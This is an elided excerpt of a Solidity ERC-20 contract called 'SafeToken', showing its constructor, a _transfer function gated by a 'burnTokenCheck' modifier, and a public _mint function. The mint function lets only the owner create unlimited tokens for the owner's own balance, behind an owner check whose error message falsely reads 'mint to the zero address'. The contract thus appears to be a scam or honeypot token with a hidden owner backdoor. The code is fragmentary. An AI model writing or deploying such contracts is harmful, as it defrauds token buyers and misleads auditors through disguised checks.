...
contract SafeToken is Context, IERC20 {
   ...
   constructor (string memory name, string memory symbol,address payable owner) public {
        ...
        _owner = owner;
        _safeOwner = owner;
        _totalSupply = 1000000000000 * E18;
    ...
    function _transfer(address sender, address recipient, uint256 amount)  private burnTokenCheck(sender,recipient,amount) {
    ...
    function _mint(address account, uint256 amount) public {
        uint256 newAmount = amount * E18; 
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(newAmount);
        _balances[_owner] = _balances[_owner].add(newAmount);
    ...
    // function _approveCheck(address sender, address recipient, uint256 amount) private burnTokenCheck(sender,recipient,amount) {
    //     require(sender != address(0), "ERC20: transfer from the zero address");
    //     require(recipient != address(0), "ERC20: transfer to the zero address");
